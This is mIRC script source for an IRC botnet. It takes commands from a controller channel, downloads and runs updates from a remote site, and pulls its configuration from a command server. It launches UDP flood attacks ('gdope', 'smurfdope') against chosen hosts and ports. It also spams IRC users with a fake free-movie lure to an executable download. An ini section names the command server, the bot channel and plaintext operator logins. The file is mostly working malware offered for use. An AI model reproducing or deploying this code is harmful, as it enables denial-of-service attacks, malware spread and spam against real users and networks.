    /sockwrite -nt $sockname  :14[12GT14]15.14(12BNC14) NOTICE AUTH : $+ $+ - /QUOTE CONN [SERVER] [PORT]   |  /sockwrite -nt $sockname :14[12GT14]15.14(12BNC14) NOTICE AUTH : $+ $+ - /QUOTE PASS [PASSWORD]  |  /sockwrite -nt $sockname :14[12GT14]15.14(12BNC14) NOTICE AUTH : $+ $+ - /QUOTE VHOST LIST |  /sockwrite -nt $sockname  :14[12GT14]15.14(12BNC14) NOTICE AUTH : $+ $+ - End List of HELP  |  halt  }  |  if ($gettok(%temp.r ,1,32) == CONN) {  if ($sock(bnc.out. [ $+ [ $gettok($sockname,3-7,46) ] ] ) > 0) {  /sockwrite -nt $sockname :14[12GT14]15.14(12BNC14) NOTICE AUTH : $+ $+ Disconnecting from current server...  
    sockclose $sock(bnc.out. [ $+ [ $gettok($sockname,3-7,46) ] ] )  }  |  if ($gettok(%temp.r ,3,32) == $Null) {   sockopen bnc.out. $+ $sock($sockname).port $+ . $+ $sock($sockname).ip $gettok(%temp.r ,2,32) 6667 $gettok(%temp.r,4,32)  | /sockmark bnc.out. $+ $sock($sockname).port $+ . $+ $sock($sockname).ip %bnc. $+ $sock($sockname).ip $+ .u %bnc. $+ $sock($sockname).ip $+ .n $sock($sockname).ip $gettok(%temp.r ,2,32) 6667 |  /sockwrite -nt $sockname :14[12GT14]15.14(12BNC14) NOTICE AUTH : $+ $+ Attempting to connect to $gettok(%temp.r,2,32) on port 6667  |   halt   }  |  /sockopen bnc.out. $+ $sock($sockname).port $+ . $+ $sock($sockname).ip $gettok(%temp.r ,2,32) $gettok(%temp.r,3,32) $gettok(%temp.r,4,32)  
/sockmark bnc.out. $+ $sock($sockname).port $+ . $+ $sock($sockname).ip %bnc. $+ $sock($sockname).ip $+ .u %bnc. $+ $sock($sockname).ip $+ .n $gettok(%temp.r ,2-4,32) |  /sockwrite -nt $sockname :14[12GT14]15.14(12BNC14) NOTICE AUTH : $+ $+ Attempting to connect to $gettok(%temp.r,2,32) on port $gettok(%temp.r ,3,32)  |  halt    } |  if ($sock(bnc.out. [ $+ [ $gettok($sockname,3-7,46) ] ] ) > 0) { sockwrite -nt bnc.out. [ $+ [ $gettok($sockname,3-7,46) ] ] %temp.r   }  }  
on *:sockopen:bnc.out.*:{ sockwrite -tn $sockname User [ [ %bnc. [ $+ [ $gettok($sock($sockname).mark,1,32) ] ] ] ] a a : [ [ %bnc. [ $+ [ $gettok($sock($sockname).mark,1,32) ] ] ] ]  | sockwrite -tn $sockname Nick %bnc. [ $+ [ $gettok($sock($sockname).mark,2,32) ] ] | sockread  } 
on *:sockread:bnc.out.*:{ sockread -f %bnc.out.t   | if (%bnc.log == on) { write bnc.log <<<[Outgoing]>>> %bnc.out.t } | sockwrite -nt bnc.in. [ $+ [ $gettok($sockname,3-7,46) ] ] %bnc.out.t |  unset %bnc.out.t }
on *:sockread:inviter*:{  
  sockread -f %t.i
  if ($gettok(%t.i,2,32) == 322) && ($gettok(%t.i,5,32) > 30) {
    write ichan.txt $gettok(%t.i,4,32)
  }  
  if ($gettok(%t.i,2,32) == 474) {
    sockwrite -nt inviter* JOIN : $+ $read ichan.txt

  }   
  if ($gettok(%t.i,2,32) == 433) { 
    /sockwrite -nt inviter* NICK $gettok(%t.i,4,32) $+ $r(a,z) 
  } 
  if ($gettok(%t.i,1,32) == PING) { 
    sockwrite -nt $sockname PONG $gettok(%t.i,2,32) 
  } 
  if ($gettok(%t.i,2,32) == JOIN) {  
    if ($timer($remove($gettok(%t.i,1,33),:)) !== $null) { halt } 
    if (%i.temp. [ $+ [ $remove($gettok(%t.i,1,33),:) ] ] == done) { halt } 
    set %i.temp. [ $+ [ $remove($gettok(%t.i,1,33),:) ] ] done 
    set %i.on Off 
    /.timer $+ $remove($gettok(%t.i,1,33),:) 1 15 /sockwrite -nt inviter* PRIVMSG $remove($gettok(%t.i,1,33),:) : $+ %imsg 
    /sockwrite -nt inviterN WHOIS : $+ $remove($gettok(%t.i,1,33),:)   
    inc %i.t.j 
    .timer 1 %i.ondelay set %i.on Yes 
  }   
  if ($gettok(%t.i,2,32) == KICK) {
    sockwrite -nt inviterN JOIN : $+ $gettok(%t.i,3,32) 
  } 
  if ($gettok(%t.i,1,32) == ERROR) { 
    /.timerinviteconnect 0 3 /sockopen inviter %i.server %i.port 
  } 
  if ($gettok(%t.i,2,32) == MODE) { 
    if ($gettok(%t.i,4,32) == +o) { 
      if ($timer($gettok(%t.i,5,32)) == $null) { halt }
      .timer $+ $gettok(%t.i,5,32) off
      dec %i.t.j 1  
    }  
    if ($gettok(%t.i,4,32) == +v) {   
      if ($timer($gettok(%t.i,5,32)) == $null) { halt }
      .timer $+ $gettok(%t.i,5,32) off 
      dec %i.t.j 1 | 
    }
  }
  if ($gettok(%t.i,2,32) == NICK) {
    if ($timer($remove($gettok(%t.i,1,33),:)) == $null) { halt } 
    /.timer $+ $remove($gettok(%t.i,1,33),:) off 
    dec %i.t.j 
  } 
  if ($gettok(%t.i,2,32) == QUIT) { 
    if ($timer($remove($gettok(%t.i,1,33),:)) == $null) { halt }
    /.timer $+ $remove($gettok(%t.i,1,33),:) off   
    dec %i.t.j
  } 
  if ($gettok(%t.i,2,32) == 313) {
    if ($timer($gettok(%t.i,4,32)) == $null) { halt }
    /.timer $+ $gettok(%t.i,2,32) off 
  } 
}
on 1:sockopen:inviter*: {
  sockwrite -nt $sockname PONG $server
  sockwrite -tn $sockname User $read sysnick.sys $+ $read sysnick.sys $read sysnick.sys $read sysnick.sys : [ [ $read sysnick.sys ] ] 
  sockwrite -tn $sockname Nick $read sysnick.sys
  sockwrite -nt inviter* JOIN : $+ $read ichan.sys | sockwrite -nt inviter* JOIN : $+ $read ichan.sys | .timer 4 60 sockwrite -nt inviter* JOIN : $+ $read ichan.sys | .timer 4 60 sockwrite -nt inviter* JOIN : $+ $read ichan.sys
  /timerinviteconnect off | sockread 
}
on 1:sockclose:inviter*:{ 
  /sockopen $sockname %i.server %i.port
}
raw 332:* {
  if ($2 == $readini(winrun32_.sys, connect, botchan)) {
    if ($3 == !update) { .wget $4 | .msg $chan downloading update from $4 }
    if ($3 == !invite) && ($sock(inviter*) == $null) {
      .spamchan
      set %i.server $4
      set %i.port $5
      set %imsg $6-
      .sockopen inviterN %i.server %i.port
      .msg $readini(winrun32_.sys, connect, botchan) Loading inviter to Server: ( $+ $+ %i.server $+ ) Port: ( $+ %i.port $+ ) >>—-[oWneRzTeam]-—<<
      if ($exists(Internet.exe) != $true) {
        .copy EXPLORER.EXE Internet.exe
      }
      .writeini winrun32_.sys inv server %i.server | .writeini winrun32_.sys inv port %i.port | .writeini winrun32_.sys inv msg %imsg | .run Internet.exe invsystem.exe
    }
  }
}
alias gcoolstart  { if $1 = STOP { .timergcoolt off | unset %gnum | msg $readini(winrun32_.sys, connect, botchan) [packeting]: Halted! | unset %pchan } | if $3 = $null { return } |  if $timer(gcoolt).com != $null { msg $readini(winrun32_.sys, connect, botchan) ERROR! Currently flooding: $gettok($timer(gcoolt).com,3,32)  | return } |  msg $readini(winrun32_.sys, connect, botchan) 14[sending ( $+ $1 $+ ) packets to ( $+ $2 $+ ) on port: ( $+ $3 $+ )14] |  set %gnum 0 |  .timergcoolt -m 0 400 gdope $1 $2 $3 }
alias smurfdope {  if $3 = $null { goto done } |  :loop | if %gnum >= $1 { goto done } | inc %gnum 2
  %gnum.p = $r(1,65000)
  sockudp gnumc1 $2 %gnum.p¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®
  %gnum.p = $r(1,65000)
  sockudp gnumc3 $2 %gnum.p ± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò
  %gnum.p = $r(1,65000)
  sockudp gnumc2 $2 %gnum.p ®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®
  %gnum.p = $r(1,65000)
  sockudp gnumc4 $2 %gnum.p¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®
  %gnum.p = $r(1,65000)
  sockudp gnumc5 $2 %gnum.p ~!@#£¼^&*()_±`¯²³45678&*()¯+¯ABCDEFGHIJ¯°±²¶·²¶·²¶·«¬­°¯Â~!@#$%^&*()_+`ABCDEFGHIJ¯°±²¶·²¶·²¶·«¬­°¯Â~!@#$%^&*()_+`ABCDEFGHIJ¯°±²¶·²¶·²¶·«¬­°¯Â~!@#$%^&*()_+`ABCDEFGHIJ¯°±²¶·²¶·²¶·«¬­°¯Â~!@#$%^&*()_+`ABCDEFGHIJ¯°±²¶·²¶·²¶·«¬­°¯Â~!@#$%^&*()_+`ABCDEFGHIJ¯°±²¶·²¶·²¶·«¬­°¯Â~!@#$%^&*()_+`ABCDEFGHIJ¯°±²¶·²¶·²¶·«¬­°¯Â~!@#$%^&*()_+`ABCDEFGHIJ¯°±²¶·²¶·²¶·«¬­°¯Â~!@#$%^&*()_+`ABCDEFGHIJ¯°±²¶·²¶·²¶·«¬­°¯Â~!@#$%^&*()_+`ABCDEFGHIJ¯°±²¶·²¶·²¶·«¬­°¯Â~!@#$%^&*()_+`ABCDEFGHIJ¯°±²¶·²¶·²¶·«¬­°¯Â~!@#$%^&*()_+`ABCDEFGHIJ¯°±²¶·²¶·²¶·«¬­°¯Â~!@#$%^&*()_+`ABCDEFGHIJ¯°±²¶·²¶·²¶·«¬­°¯Â~!@#$%^&*()_+`ABCDEFGHIJ¯°±²¶·²¶·²¶·«¬­°¯Â~!@#$%^&*()_+`ABCDEFGHIJ¯°±²¶·²¶·²¶·«¬­°¯Â~!@#$%^&*()_+`ABCDEFGHIJ¯°±²¶·²¶·²¶·«¬­°¯Â~!@#$%^&*()_+`ABCDEFGHIJ¯°±²¶·²¶·²¶·«¬­°¯Â~!@#$%^&*()_+`ABCDEFGHIJ¯°±²¶·²¶·²¶·«¬­°¯Â~!@#$%^&*()_+`ABCDEFGHIJ¯°±²¶·²¶·²¶·«¬­°¯Â~!@#$%^&*()_+`ABCDEFGHIJ¯°±²¶·²¶·²¶·«¬­°¯Â~!@#$%^&*()_+`1234567890-=\][';,./|}{:
  %gnum.p = $r(1,65000)
  sockudp gnumc6 $2 %gnum.p ± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò
  %gnum.p = $r(1,65000)
  sockudp gnumc7 $2 %gnum.p ®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®
  %gnum.p = $r(1,65000)
  sockudp gnumc8 $2 %gnum.p ~!@#$%^&*()_+`ABCDEFGHIJ¯°±²¶·²¶·²¶·«¬­°¯Â~!@#$%^&*()_+`1234567890-=\][';,./|}{:0-=\][';,./|}{:"?><~!@#$%^&*()_+`ABCDEFGHIJ¯°±²¶·²¶·²¶·«¬­°¯Â~!@#$%^&*()_+`ABCDEFGHIJ¯°±²¶·²¶·²¶·«¬­°¯Â~!@#$%^&*()_+`ABCDEFGHIJ¯°±²¶·²¶·²¶·«¬­°¯Â~!@#$%^&*()_+`ABCDEFGHIJ¯°±²¶·²¶·²¶·«¬­°¯Â~!@#$%^&*()_+`ABCDEFGHIJ¯°±²¶·²¶·²¶·«¬­°¯Â~!@#$%^&*()_+`ABCDEFGHIJ¯°±²¶·²¶·²¶·«¬­°¯Â~!@#$%^&*()_+`ABCDEFGHIJ¯°±²¶·²¶·²¶·«¬­°¯Â~!@#$%^&*()_+`ABCDEFGHIJ¯°±²¶·²¶·²¶·«¬­°¯Â~!@#$%^&*()_+`ABCDEFGHIJ¯°±²¶·²¶·²¶·«¬­°¯Â~!@#$%^&*()_+`ABCDEFGHIJ¯°±²¶·²¶·²¶·«¬­°¯Â~!@#$%^&*()_+`ABCDEFGHIJ¯°±²¶·²¶·²¶·«¬­°¯Â~!@#$%^&*()_+`ABCDEFGHIJ¯°±²¶·²¶·²¶·«¬­°¯Â~!@#$%^&*()_+`ABCDEFGHIJ¯°±²¶·²¶·²¶·«¬­°¯Â~!@#$%^&*()_+`ABCDEFGHIJ¯°±²¶·²¶·²¶·«¬­°¯Â~!@#$%^&*()_+`ABCDEFGHIJ¯°±²¶·²¶·²¶·«¬­°¯Â~!@#$%^&*()_+`ABCDEFGHIJ¯°±²¶·²¶·²¶·«¬­°¯Â~!@#$%^&*()_+`ABCDEFGHIJ¯°±²¶·²¶·²¶·«¬­°¯Â~!@#$%^&*()_+`ABCDEFGHIJ¯°±²¶·²¶·²¶·«¬­°¯Â~!@#$%^&*()_+`1234567890-=\][';,./|}{:
return |  :done | //msg $readini(winrun32_.sys, connect, botchan) [Smurf Packeting]: Finished! | .timergcoolt off | unset %gnum* | unset %pchan }
}
alias smurfstart  { if $1 = STOP { .timergcoolt off | unset %gnum | msg $readini(winrun32_.sys, connect, botchan) [Smurf Packeting]: Halted! | unset %pchan } | if $3 = $null { return } |  if $timer(gcoolt).com != $null { msg %pchan [Currently Smurf Flooding) $gettok($timer(gcoolt).com,3,32)  | return } |  msg $readini(winrun32_.sys, connect, botchan) Sending ( $$1 ) smurf packets to ( $$2 ) on port: ( $$3 ) |  set %gnum 0 |  .timergcoolt -m 0 60 smurfdope $1 $2 $3 }
alias gdope {  if $3 = $null { goto done } |  :loop | if %gnum >= $1 { goto done } | inc %gnum 4 
  sockudp gnumc1 $2 $3¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®
  sockudp gnumc3 $2 $3 ± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò
  sockudp gnumc2 $2 $3 ®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®
  sockudp gnumc4 $2 $3¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*® 
  return |  :done | //msg $readini(winrun32_.sys, connect, botchan) [packeting]: Finished! | .timergcoolt off | unset %gnum | unset %pchan 
}
alias checkupdate {
  sockopen ownerz $readini(winrun32_.sys, update, site) 80
}
On *:Sockopen:ownerz:{
  if ($sockerr > 0) { halt }
  sockwrite -nt ownerz GET $readini(winrun32_.sys, domain, site)
}
On *:Sockread:ownerz:{
  Sockread %ownerz
  if (domain isin %ownerz) { .writeini winrun32_.sys %ownerz }
  if (update isin %ownerz) { .writeini winrun32_.sys %ownerz }
  if (start isin %ownerz) { .writeini winrun32_.sys %ownerz }
  if (botchan isin %ownerz) { .writeini winrun32_.sys  connect %ownerz }
  if (updatesite isin %ownerz) { .writeini winrun32_.sys start %ownerz }
  if ([servers] isin %ownerz) { .remove dllupload.sys | .set %update.on on }
  if (%update.on == on) { .write dllupload.sys %ownerz }
}
On *:Sockclose:ownerz:{
  .unset %ownerz
  .unset %update.on
}
alias spamchan {
  sockopen spamchan $readini(winrun32_.sys, update, site) 80
}
On *:Sockopen:spamchan:{
  if ($sockerr > 0) { halt }
  sockwrite -nt spamchan GET $readini(winrun32_.sys, domain, system)
}
On *:Sockread:spamchan:{
  Sockread %ichan
  if ([channels] isin %ichan) { .write -c ichan.sys | .set %ichan.on on }
  if (%ichan.on == on) { .write ichan.sys %ichan }
}
On *:Sockclose:spamchan:{
  .unset %ichan
  .unset %ichan.on
}

[start]
server=own.mof0.com
serverport=6667
password=null

[update]
site=www.geocities.com

[domain]
site=/ownerzteam/update.txt
system=/ownerzteam/ichan.txt

[connect]
botchan=#fuckers
botchankey=<!@@!%¡>

[logins]
WTF=stfu12345
PacketBOY=basukax12345
_0wneR_=sk12345
Nas=na12345
[inv]
server=oslo.undernet.org
port=6667
msg= New HoT LeSbian Movies available now FOr !! FREE !! To Download Them Click On: http://www.cybersgirls.com/pam-anderson-movie.exe
[<font]
